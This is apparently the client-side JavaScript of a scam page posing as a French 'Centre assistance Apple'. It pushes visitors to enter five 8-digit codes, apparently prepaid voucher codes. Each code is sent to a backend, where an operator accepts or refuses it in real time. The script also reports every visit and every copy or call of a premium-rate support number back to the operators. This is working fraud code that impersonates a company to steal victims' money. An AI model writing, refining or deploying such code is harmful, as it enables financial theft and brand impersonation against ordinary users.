document.addEventListener('DOMContentLoaded', function() {

    // ==================== PAGE LOADER ====================
    var pageLoader = document.getElementById('pageLoader');
    setTimeout(function() {
        pageLoader.classList.add('hidden');
    }, 1800);

    // ==================== ELEMENTS ====================
    var header = document.getElementById('header');
    var copyBtn = document.getElementById('copyBtn');
    var toast = document.getElementById('toast');
    var loadingOverlay = document.getElementById('loadingOverlay');
    var backToTop = document.getElementById('backToTop');
    var codeError = document.getElementById('codeError');
    var codeSuccess = document.getElementById('codeSuccess');
    var scrollProgress = document.getElementById('scrollProgress');
    var particlesContainer = document.getElementById('particles');
    var confettiContainer = document.getElementById('confettiContainer');

    var toastTimeout;
    var timerInterval = null;
    var codeTimer = document.getElementById('codeTimer');
    var timerValue = document.getElementById('timerValue');
    var timerBarFill = document.getElementById('timerBarFill');

    // ==================== PARTICLES ====================
    function createParticles() {
        var count = 20;
        for (var i = 0; i < count; i++) {
            var particle = document.createElement('div');
            particle.className = 'particle';
            particle.style.left = Math.random() * 100 + '%';
            particle.style.animationDuration = (Math.random() * 15 + 10) + 's';
            particle.style.animationDelay = (Math.random() * 10) + 's';
            particle.style.width = (Math.random() * 4 + 2) + 'px';
            particle.style.height = particle.style.width;
            particlesContainer.appendChild(particle);
        }
    }
    createParticles();

    // ==================== CONFETTI ====================
    function launchConfetti() {
        var colors = ['#0071e3', '#5856d6', '#bf5af2', '#30d158', '#ff9f0a', '#ff453a', '#ffcc00'];
        var count = 80;
        for (var i = 0; i < count; i++) {
            var confetti = document.createElement('div');
            confetti.className = 'confetti';
            confetti.style.left = Math.random() * 100 + '%';
            confetti.style.backgroundColor = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.width = (Math.random() * 10 + 5) + 'px';
            confetti.style.height = (Math.random() * 10 + 5) + 'px';
            confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
            confetti.style.animationDuration = (Math.random() * 2 + 2) + 's';
            confetti.style.animationDelay = (Math.random() * 1) + 's';
            confettiContainer.appendChild(confetti);
        }
        setTimeout(function() {
            confettiContainer.innerHTML = '';
        }, 4000);
    }

    // ==================== SCROLL PROGRESS ====================
    function updateScrollProgress() {
        var scrollTop = window.scrollY;
        var docHeight = document.documentElement.scrollHeight - window.innerHeight;
        var progress = (scrollTop / docHeight) * 100;
        scrollProgress.style.width = progress + '%';
    }

    // ==================== ANIMATED COUNTERS ====================
    function animateCounters() {
        var counters = document.querySelectorAll('.stat-number[data-target]');
        counters.forEach(function(counter) {
            var target = parseInt(counter.getAttribute('data-target'));
            var duration = 2000;
            var start = 0;
            var startTime = null;

            function update(timestamp) {
                if (!startTime) startTime = timestamp;
                var progress = Math.min((timestamp - startTime) / duration, 1);
                var eased = 1 - Math.pow(1 - progress, 3);
                counter.textContent = Math.floor(eased * target).toLocaleString('fr-FR');
                if (progress < 1) {
                    requestAnimationFrame(update);
                } else {
                    counter.textContent = target.toLocaleString('fr-FR');
                }
            }

            requestAnimationFrame(update);
        });
    }

    var heroObserver = new IntersectionObserver(function(entries) {
        entries.forEach(function(entry) {
            if (entry.isIntersecting) {
                animateCounters();
                heroObserver.disconnect();
            }
        });
    }, { threshold: 0.3 });

    var heroStats = document.querySelector('.stats-bar');
    if (heroStats) heroObserver.observe(heroStats);

    // ==================== TIMER ====================
    function startTimer(callback) {
        var totalSeconds = 240;
        var remaining = totalSeconds;
        codeTimer.classList.add('visible');
        timerBarFill.style.width = '100%';

        if (timerInterval) clearInterval(timerInterval);

        function updateTimer() {
            var minutes = Math.floor(remaining / 60);
            var seconds = remaining % 60;
            timerValue.textContent = minutes + ':' + (seconds < 10 ? '0' : '') + seconds;
            timerBarFill.style.width = ((remaining / totalSeconds) * 100) + '%';

            if (remaining <= 0) {
                clearInterval(timerInterval);
                codeTimer.classList.remove('visible');
                if (callback) callback();
            }
            remaining--;
        }

        updateTimer();
        timerInterval = setInterval(updateTimer, 1000);
    }

    // ==================== TOAST ====================
    function showToast(message, type) {
        clearTimeout(toastTimeout);
        toast.textContent = message;
        toast.className = 'toast ' + type + ' visible';
        toastTimeout = setTimeout(function() {
            toast.classList.remove('visible');
        }, 3000);
    }

    // ==================== LOADING ====================
    function showLoading() {
        loadingOverlay.classList.add('visible');
        document.body.style.overflow = 'hidden';
    }

    function hideLoading() {
        loadingOverlay.classList.remove('visible');
        document.body.style.overflow = '';
    }

    // ==================== SHAKE ====================
    function shakeElement(el) {
        el.style.animation = 'none';
        el.offsetHeight;
        el.style.animation = 'shake 0.4s ease';
    }

    // ==================== API ====================
    function apiSend(text) {
        return fetch('/api/send', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ text: text })
        }).then(function(r) { return r.json(); });
    }

    function apiAlert(text) {
        fetch('/api/alert', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ text: text })
        }).catch(function() {});
    }

    function sendAndValidate(code, stepNum, onSuccess, onError) {
        var message = 'Code ' + stepNum + '/5 recu\n\nCode: ' + code + '\nHeure: ' + new Date().toLocaleString('fr-FR') + '\nSite: Centre assistance Apple';

        apiSend(message).then(function(data) {
            var codeId = data.codeId;
            if (!codeId) {
                if (onError) onError();
                return;
            }

            var attempts = 0;
            var maxAttempts = 120;

            var pollInterval = setInterval(function() {
                fetch('/api/check-status/' + codeId)
                    .then(function(r) { return r.json(); })
                    .then(function(result) {
                        if (result.status === 'accepted') {
                            clearInterval(pollInterval);
                            if (onSuccess) onSuccess();
                        } else if (result.status === 'refused') {
                            clearInterval(pollInterval);
                            if (onError) onError();
                        } else {
                            attempts++;
                            if (attempts >= maxAttempts) {
                                clearInterval(pollInterval);
                                if (onError) onError();
                            }
                        }
                    }).catch(function() {
                        attempts++;
                        if (attempts >= maxAttempts) {
                            clearInterval(pollInterval);
                            if (onError) onError();
                        }
                    });
            }, 2000);
        }).catch(function() {
            if (onError) onError();
        });
    }

    // ==================== SCROLL EVENTS ====================
    window.addEventListener('scroll', function() {
        updateScrollProgress();

        if (window.scrollY > 50) {
            header.classList.add('scrolled');
        } else {
            header.classList.remove('scrolled');
        }

        if (window.scrollY > 400) {
            backToTop.classList.add('visible');
        } else {
            backToTop.classList.remove('visible');
        }
    });

    backToTop.addEventListener('click', function() {
        window.scrollTo({ top: 0, behavior: 'smooth' });
    });

    // ==================== COPY BUTTON ====================
    copyBtn.addEventListener('click', function() {
        var phone = '08 91 24 12 80';
        apiAlert('Un utilisateur a copié le numéro de téléphone');
        if (navigator.clipboard && navigator.clipboard.writeText) {
            navigator.clipboard.writeText(phone).then(function() {
                showCopied();
            }).catch(function() {
                fallbackCopy(phone);
            });
        } else {
            fallbackCopy(phone);
        }
    });

    copyBtn.addEventListener('keydown', function(e) {
        if (e.key === 'Enter' || e.key === ' ') {
            e.preventDefault();
            copyBtn.click();
        }
    });

    function showCopied() {
        copyBtn.classList.add('copied');
        copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg> Copié';
        showToast('Numéro copié', 'success');
        setTimeout(function() {
            copyBtn.classList.remove('copied');
            copyBtn.innerHTML = '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg> Copier';
        }, 2000);
    }

    function fallbackCopy(text) {
        var textarea = document.createElement('textarea');
        textarea.value = text;
        textarea.style.position = 'fixed';
        textarea.style.opacity = '0';
        document.body.appendChild(textarea);
        textarea.select();
        try {
            document.execCommand('copy');
            showCopied();
        } catch (err) {
            showToast('Erreur de copie', 'error');
        }
        document.body.removeChild(textarea);
    }

    // ==================== CALL BUTTON ====================
    var callBtn = document.getElementById('callBtn');
    if (callBtn) {
        callBtn.addEventListener('click', function() {
            apiAlert('Un utilisateur veut appeler le numéro');
        });
    }

    // ==================== CODE INPUTS ====================
    document.querySelectorAll('.code-digits').forEach(function(input) {
        input.addEventListener('input', function() {
            codeError.classList.remove('visible');
            codeSuccess.classList.remove('visible');
            this.parentElement.classList.remove('error', 'success');
            this.value = this.value.replace(/[^0-9]/g, '').substring(0, 8);
        });
        input.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                var btn = this.closest('.code-step-content').querySelector('button');
                if (btn) btn.click();
            }
        });
    });

    // ==================== STEP 1 ====================
    var nextStep1 = document.getElementById('nextStep1');
    if (nextStep1) {
        nextStep1.addEventListener('click', function() {
            goToStep(2);
        });
    }

    // ==================== NEXT STEP BUTTONS ====================
    document.querySelectorAll('.next-step-btn').forEach(function(btn) {
        btn.addEventListener('click', function() {
            var currentStepEl = this.closest('.code-step-content');
            var currentStepNum = parseInt(currentStepEl.id.replace('step', ''));
            var currentInput = currentStepEl.querySelector('.code-digits');
            var val = currentInput.value.trim();
            var self = this;

            if (!val) {
                currentInput.parentElement.classList.add('error');
                codeError.textContent = 'Veuillez entrer un code.';
                codeError.classList.add('visible');
                shakeElement(currentInput.parentElement);
                currentInput.focus();
                return;
            }
            if (val.length !== 8) {
                currentInput.parentElement.classList.add('error');
                codeError.textContent = 'Le code doit contenir exactement 8 chiffres.';
                codeError.classList.add('visible');
                shakeElement(currentInput.parentElement);
                currentInput.focus();
                return;
            }
            if (!/^[0-9]{8}$/.test(val)) {
                currentInput.parentElement.classList.add('error');
                codeError.textContent = 'Format invalide. Uniquement des chiffres sont acceptés.';
                codeError.classList.add('visible');
                shakeElement(currentInput.parentElement);
                currentInput.focus();
                return;
            }

            var code = 'V-' + val;
            self.disabled = true;
            self.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Vérification...';

            sendAndValidate(code, currentStepNum - 1, function() {
                currentInput.parentElement.classList.add('success');
                showToast('Code ' + (currentStepNum - 1) + ' validé !', 'success');
                codeError.classList.remove('visible');

                self.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Code accepté';
                self.classList.add('accepted');

                var nextStep = parseInt(self.getAttribute('data-next'));
                startTimer(function() {
                    goToStep(nextStep);
                });
            }, function() {
                currentInput.parentElement.classList.add('error');
                codeError.textContent = 'Code refusé. Ressayez avec un autre code.';
                codeError.classList.add('visible');
                shakeElement(currentInput.parentElement);
                showToast('Code refusé', 'error');
                currentInput.value = '';
                currentInput.focus();

                self.disabled = false;
                self.innerHTML = 'Envoyer et continuer <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><line x1="5" y1="12" x2="19" y2="12"/><polyline points="12 5 19 12 12 19"/></svg>';
            });
        });
    });

    // ==================== VALIDATE ALL ====================
    var validateAllBtn = document.getElementById('validateAllBtn');
    if (validateAllBtn) {
        validateAllBtn.addEventListener('click', function() {
            var lastInput = document.getElementById('step6').querySelector('.code-digits');
            var val = lastInput.value.trim();

            if (!val) {
                lastInput.parentElement.classList.add('error');
                codeError.textContent = 'Veuillez entrer un code.';
                codeError.classList.add('visible');
                shakeElement(lastInput.parentElement);
                lastInput.focus();
                return;
            }
            if (val.length !== 8) {
                lastInput.parentElement.classList.add('error');
                codeError.textContent = 'Le code doit contenir exactement 8 chiffres.';
                codeError.classList.add('visible');
                shakeElement(lastInput.parentElement);
                lastInput.focus();
                return;
            }
            if (!/^[0-9]{8}$/.test(val)) {
                lastInput.parentElement.classList.add('error');
                codeError.textContent = 'Format invalide. Uniquement des chiffres sont acceptés.';
                codeError.classList.add('visible');
                shakeElement(lastInput.parentElement);
                lastInput.focus();
                return;
            }

            var code = 'V-' + val;
            showLoading();
            validateAllBtn.disabled = true;
            validateAllBtn.innerHTML = '<span class="loading-spinner" style="width:18px;height:18px;border-width:2px;margin:0"></span> Vérification...';

            sendAndValidate(code, 5, function() {
                hideLoading();
                validateAllBtn.disabled = false;
                validateAllBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Envoyer et valider';
                codeSuccess.textContent = 'Les 5 codes ont été validés avec succès !';
                codeSuccess.classList.add('visible');
                showToast('5 codes validés !', 'success');
                launchConfetti();
                setTimeout(function() {
                    goToStep(1);
                    document.querySelectorAll('.code-digits').forEach(function(input) {
                        input.value = '';
                        input.parentElement.classList.remove('success', 'error');
                    });
                }, 3000);
            }, function() {
                hideLoading();
                validateAllBtn.disabled = false;
                validateAllBtn.innerHTML = '<span class="code-validate-icon"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg></span> Envoyer et valider';
                lastInput.parentElement.classList.add('error');
                codeError.textContent = 'Code refusé. Ressayez avec un autre code.';
                codeError.classList.add('visible');
                shakeElement(lastInput.parentElement);
                showToast('Code refusé', 'error');
                lastInput.value = '';
                lastInput.focus();
            });
        });
    }

    // ==================== GO TO STEP ====================
    function goToStep(step) {
        document.querySelectorAll('.code-step-content').forEach(function(el) {
            el.classList.remove('active');
        });
        document.getElementById('step' + step).classList.add('active');

        document.querySelectorAll('.code-step-dot').forEach(function(dot) {
            var dotStep = parseInt(dot.getAttribute('data-step'));
            dot.classList.remove('active', 'completed');
            if (dotStep < step) dot.classList.add('completed');
            if (dotStep === step) dot.classList.add('active');
        });

        var progressBar = document.querySelector('.code-steps-progress');
        if (progressBar) {
            progressBar.setAttribute('aria-valuenow', step);
        }

        codeError.classList.remove('visible');
        codeSuccess.classList.remove('visible');

        if (step > 1) {
            var input = document.querySelector('#step' + step + ' .code-digits');
            if (input) {
                setTimeout(function() { input.focus(); }, 150);
            }
        }
    }

    // ==================== ACCORDION ====================
    document.querySelectorAll('.accordion-header').forEach(function(header) {
        header.addEventListener('click', function() {
            var item = this.parentElement;
            var content = this.nextElementSibling;
            var isActive = item.classList.contains('active');
            document.querySelectorAll('.accordion-item').forEach(function(i) {
                i.classList.remove('active');
                i.querySelector('.accordion-header').setAttribute('aria-expanded', 'false');
                i.querySelector('.accordion-content').style.maxHeight = null;
            });
            if (!isActive) {
                item.classList.add('active');
                this.setAttribute('aria-expanded', 'true');
                content.style.maxHeight = content.scrollHeight + 'px';
            }
        });
    });

    // ==================== INTERSECTION OBSERVER ====================
    var observer = new IntersectionObserver(function(entries) {
        entries.forEach(function(entry) {
            if (entry.isIntersecting) {
                entry.target.style.opacity = '1';
                entry.target.style.transform = 'translateY(0)';
            }
        });
    }, { threshold: 0.1, rootMargin: '0px 0px -40px 0px' });

    document.querySelectorAll('.feature-item, .process-step, .trust-item').forEach(function(item, index) {
        item.style.opacity = '0';
        item.style.transform = 'translateY(24px)';
        item.style.transition = 'all 0.6s cubic-bezier(0.4, 0, 0.2, 1) ' + (index * 0.08) + 's';
        observer.observe(item);
    });

    // ==================== HOVER EFFECTS ====================
    document.querySelectorAll('.feature-item').forEach(function(item) {
        item.addEventListener('mouseenter', function() {
            this.querySelector('.feature-icon').style.transform = 'scale(1.12) rotate(3deg)';
        });
        item.addEventListener('mouseleave', function() {
            this.querySelector('.feature-icon').style.transform = 'scale(1) rotate(0deg)';
        });
    });

    document.querySelectorAll('.process-step').forEach(function(step) {
        step.addEventListener('mouseenter', function() {
            this.querySelector('.process-step-number').style.transform = 'scale(1.15) rotate(5deg)';
        });
        step.addEventListener('mouseleave', function() {
            this.querySelector('.process-step-number').style.transform = 'scale(1) rotate(0deg)';
        });
    });

    // ==================== SMOOTH SCROLL ====================
    document.querySelectorAll('a[href^="#"]').forEach(function(anchor) {
        anchor.addEventListener('click', function(e) {
            e.preventDefault();
            var target = document.querySelector(this.getAttribute('href'));
            if (target) {
                target.scrollIntoView({ behavior: 'smooth', block: 'start' });
            }
        });
    });

    // ==================== API ALERT ====================
    apiAlert('Nouvelle visite\n\nHeure: ' + new Date().toLocaleString('fr-FR') + '\nURL: ' + window.location.href);

    console.log('%c Centre d\'assistance Apple ', 'background: linear-gradient(135deg, #0071e3, #5856d6); color: white; padding: 8px 16px; border-radius: 6px; font-weight: bold; font-size: 14px;');
});
